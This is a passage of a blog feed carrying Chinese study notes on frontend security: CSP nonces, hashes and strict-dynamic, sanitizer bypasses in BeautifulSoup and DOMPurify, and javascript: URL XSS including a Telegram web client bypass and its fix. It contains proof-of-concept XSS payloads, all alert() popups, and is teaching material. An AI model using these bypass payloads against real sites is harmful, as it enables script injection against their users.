class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;nonce-123&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">123</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>不允许执行不一样的与csp中的nonce不一样的</p><h4 id="sha256-xxxx"><a href="#sha256-xxxx" class="headerlink" title="sha256-xxxx"></a>sha256-xxxx</h4><p>我这里用一段python代码完成这个，也方便以后的操作<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;alert(1)&quot;</span></span><br><span class="line">hash_object = hashlib.sha256(message.encode())</span><br><span class="line">hash_base64 = base64.b64encode(hash_object.digest())</span><br><span class="line"><span class="built_in">print</span>(hash_base64.decode())</span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A85-CSP%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/5.png" alt></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  CSP test</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行执行sha256一样的</p><h4 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;nonce-rjg103rj1298e&#x27; &#x27;strict-dynamic&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">rjg103rj1298e</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> element = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    element.<span class="property">src</span> = <span class="string">&#x27;test.js&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(element)</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从<code>nonce=rjg103rj1298e</code>这段生成的js代码也可以运行，因为<code>strict-dynamic</code></p><h2 id="CSP的配置"><a href="#CSP的配置" class="headerlink" title="CSP的配置"></a>CSP的配置</h2><p><a href="https://csp-evaluator.withgoogle.com">https://csp-evaluator.withgoogle.com</a><br>可以用这个网站查看csp策略是否有问题</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为绕过的方式太多，有时候一不小心就会写出一个含有xss漏洞的代码，这时候要怎么去防御。那么就是依靠CSP进行防御了&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10315612&quot;&gt;https://ithelp.ithome.com.tw/articles/10315612&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>前端安全4-Sanitization（笔记）</title>
    <link href="http://example.com/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-23T16:14:43.000Z</published>
    <updated>2023-09-24T03:00:23.948Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇主要讲讲xss的绕过和防御</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10315367">https://ithelp.ithome.com.tw/articles/10315367</a><span id="more"></span></li></ul><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>上一篇讲过了，编码在一些情况下是无法进行过滤xss的，下面是一些常见框架或语言过滤xss的方法</p><ul><li>前端：一般使用<code>innerText</code>来代替<code>innerHTML</code></li><li>Laravel： <code>&#123;&#123; $text &#125;&#125;</code>是编码的，<code>&#123;!! $text !!&#125;</code>是原本的</li><li>Jinja：<code>&#123;&#123; test &#125;&#125;</code> 是编码的，<code>&#123;&#123; text | safe &#125;&#125;</code>是原始格式</li></ul><p>但是有些时候，就是需要输出一些带有html的代码，这时候应该如何去过滤</p><h2 id="sanitize"><a href="#sanitize" class="headerlink" title="sanitize"></a>sanitize</h2><p>先来说说BeautifulSoup，当你用他进行解析html，想过滤一些东西的时候，就有可能会出现问题<br>先来看看简单的demo<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    test</span></span><br><span class="line"><span class="string">    &lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"><span class="string">    &lt;img src=x onerror=alert(1)&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tree = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> tree.find_all():</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;name: <span class="subst">&#123;element.name&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;attrs: <span class="subst">&#123;element.attrs&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><br>这段代码的output是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">name: div</span><br><span class="line">attrs: &#123;&#125;</span><br><span class="line">name: script</span><br><span class="line">attrs: &#123;&#125;</span><br><span class="line">name: img</span><br><span class="line">attrs: &#123;<span class="string">&#x27;src&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;onerror&#x27;</span>: <span class="string">&#x27;alert(1)&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><br>但是当你遇到下面的代码<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  &lt;div&gt;</span></span><br><span class="line"><span class="string">    test</span></span><br><span class="line"><span class="string">    &lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tree = BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> element <span class="keyword">in</span> tree.find_all():</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;name: <span class="subst">&#123;element.name&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;attrs: <span class="subst">&#123;element.attrs&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><br>这段的输出是<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name: div</span><br><span class="line">attrs: &#123;&#125;</span><br></pre></td></tr></table></figure><br>看上去好像没问题，因为这行代码看上去是注释<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;</span></span><br></pre></td></tr></table></figure><br>但是其实，在浏览器的解析中碰到第一个<code>&gt;</code>的时候就已经闭合注释了，但是BeautifulSoup中，他是解析为到最后一个<code>&gt;</code>都是注释<br>这里有相应的ctf题</p><ul><li><a href="https://github.com/Seraphin-/ctf/blob/master/irisctf2023/feelingtagged.md">https://github.com/Seraphin-/ctf/blob/master/irisctf2023/feelingtagged.md</a></li><li><a href="https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu#bypassing-html-sanitization">https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu#bypassing-html-sanitization</a></li></ul><h2 id="DOMPurify"><a href="#DOMPurify" class="headerlink" title="DOMPurify"></a>DOMPurify</h2><p>基本用法如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> clean = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html);</span><br></pre></td></tr></table></figure><br>他并不是单纯的过滤或者编码<br>该套件运行一些安全的tag，和一些安全的attr<br>当然可以通过配置增加一些tag或者attr，如下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">ADD_TAGS</span>: [<span class="string">&#x27;iframe&#x27;</span>],</span><br><span class="line">  <span class="attr">ADD_ATTR</span>: [<span class="string">&#x27;src&#x27;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> html = <span class="string">&#x27;&lt;div&gt;&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br><span class="line"><span class="comment">// &lt;div&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line">html = <span class="string">&#x27;&lt;div&gt;&lt;iframe src=https://example.com&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br><span class="line"><span class="comment">// &lt;div&gt;&lt;iframe src=&quot;https://example.com&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>但是可以看到，对于不安全的代码，仍然会过滤掉，但是在一些情况下也不会被过滤掉<br>就比如下面这种<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">  <span class="attr">ADD_TAGS</span>: [<span class="string">&#x27;iframe&#x27;</span>],</span><br><span class="line">  <span class="attr">ADD_ATTR</span>: [<span class="string">&#x27;srcdoc&#x27;</span>],</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">html = <span class="string">&#x27;&lt;div&gt;&lt;iframe srcdoc=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(html, config))</span><br></pre></td></tr></table></figure><br><img src="/2023/09/24/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A84-Sanitization%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/2.png" alt></p><h3 id="xhtml和html"><a href="#xhtml和html" class="headerlink" title="xhtml和html"></a>xhtml和html</h3><p>在style标签底下的尖括号都不会被DOMPurify给过滤<br>这是一个挺重要的特性，在之前DOMPurify变体中就会造成绕过，在html和xhtml的解析标准不同下，也会造成绕过的漏洞<br>还有一个特点就是，在属性中的内容也不会被转义<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;![CDATA[<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;]]&gt;&lt;/style&gt;&lt;script&gt;&lt;/script&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在html中这段看似没问题，DOMPurify也不会对他进行过滤<br>但是在xhtml中，CDATA那段就会被视为注释<br><figure class="highlight xhtml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>最后就会解析成这种样子</p><h2 id="错误的使用这些库的方式"><a href="#错误的使用这些库的方式" class="headerlink" title="错误的使用这些库的方式"></a>错误的使用这些库的方式</h2><p>这里因为没有亲身经历过，也没办法复现，还是去看huli大佬的博客吧</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇主要讲讲xss的绕过和防御&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10315367&quot;&gt;https://ithelp.ithome.com.tw/articles/10315367&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="前端安全" scheme="http://example.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="http://example.com/tags/javascript/"/>
    
    <category term="xss" scheme="http://example.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>前端安全3-js伪协议（笔记）</title>
    <link href="http://example.com/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>http://example.com/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-09-23T10:51:56.000Z</published>
    <updated>2023-09-23T16:24:12.474Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以前一直以为经过htmlspecialchars之后就不存在xss漏洞了，现在想来还是我太肤浅了</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10315118">https://ithelp.ithome.com.tw/articles/10315118</a><span id="more"></span><h2 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h2>可以触发的标签<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>Link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">f2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">form</span>=<span class="string">f2</span> <span class="attr">formaction</span>=<span class="string">javascript:alert(2)</span>&gt;</span>submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>这种一般都是容易被忽略的注入xss的点，看到下面的代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$data</span>) ?&gt;&quot;</span>&gt;link&lt;/a&gt;`</span><br></pre></td></tr></table></figure>虽然他被html编码了，但是仍然可以用伪协议去触发<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/3.png" alt></li></ul><p>当然，<code>window.location</code>也是可以触发伪协议的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="string">&#x27;javascript:alert(1)&#x27;</span></span><br></pre></td></tr></table></figure></p><h2 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h2><p>上面已经提到过了，html编码是行不通的，直接删掉javascript，攻击者就可以通过下面的代码进行绕过<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&amp;#106avascript:alert(1)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>所以一般是通过白名单的方式，验证他的开头是否是http或者https这样<br>在tg中就出现过这样的问题<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ensureProtocol</span>(<span class="params">url?: string</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!url) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> url.<span class="title function_">includes</span>(<span class="string">&#x27;://&#x27;</span>) ? url : <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>他并没有判断开头是否是<code>http://</code>或者是<code>https://</code>，所以导致攻击者可以用下面的代码进行绕过<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;://&#x27;</span>)</span><br></pre></td></tr></table></figure><br>但是要在服务器也会判断上面的代码是否合规，那上面的代码显然不行，不过攻击者用了一种特殊写法绕过了。<br>URL的完全体一般是长下面的样子的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://username:password@www.example.com/</span><br></pre></td></tr></table></figure><br>所以构造绕过payload<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&#x27;Slonser was here!&#x27;</span>);<span class="comment">//@github.com</span></span><br></pre></td></tr></table></figure><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;Slonser was here!&#x27;);//@github.com&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就能弹窗了<br>tg的修复方式如下<br><a href="https://github.com/Ajaxy/telegram-tt/commit/a8d025395bc0032d964c2afc8c4fb5d2fa631a44">https://github.com/Ajaxy/telegram-tt/commit/a8d025395bc0032d964c2afc8c4fb5d2fa631a44</a><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">ensureProtocol</span>(<span class="params">url?: string</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!url) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// HTTP was chosen by default as a fix for https://bugs.telegram.org/c/10712.</span></span><br><span class="line">  <span class="comment">// It is also the default protocol in the official TDesktop client.</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> parsedUrl = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line">    <span class="comment">// eslint-disable-next-line no-script-url</span></span><br><span class="line">    <span class="keyword">if</span> (parsedUrl.<span class="property">protocol</span> === <span class="string">&#x27;javascript:&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> url;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`http://<span class="subst">$&#123;url&#125;</span>`</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>利用URL去解析url，并提取出protocol，并判断</p><h2 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h2><p>一般来说加个<code>target=&quot;_blank&quot;</code>，就可以解决上面的问题<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://kaikaix.github.io&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>在chrome中，点开上面的会先新建一个about:blank，然后在打开博客<br>在firefox中，会先新建一个空页面，在打开博客<br>但是所有都是先新建一个空页面，再去操作<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(1)&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><br>如果是如上的情况就只会新建一个页面，然后不会有其他的操作<br>但是这只是用鼠标左键的情况<br>当你用鼠标中键，也就是按一下那个滚轮，或者你用ctrl加左键，同样可以触发<br><img src="/2023/09/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A83-js%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/4.png" alt></p><h2 id="题外话-innerHTML和innerText"><a href="#题外话-innerHTML和innerText" class="headerlink" title="题外话 innerHTML和innerText"></a>题外话 innerHTML和innerText</h2><h3 id="innerHTML"><a href="#innerHTML" class="headerlink" title="innerHTML"></a>innerHTML</h3><p>现在有一个test.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span> = <span class="string">&#x27;可控，但是无法绕过引号&#x27;</span></span><br></pre></td></tr></table></figure><br>另一个页面加载了该js<br>这时候应该怎么去执行xss<br>如果是<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span 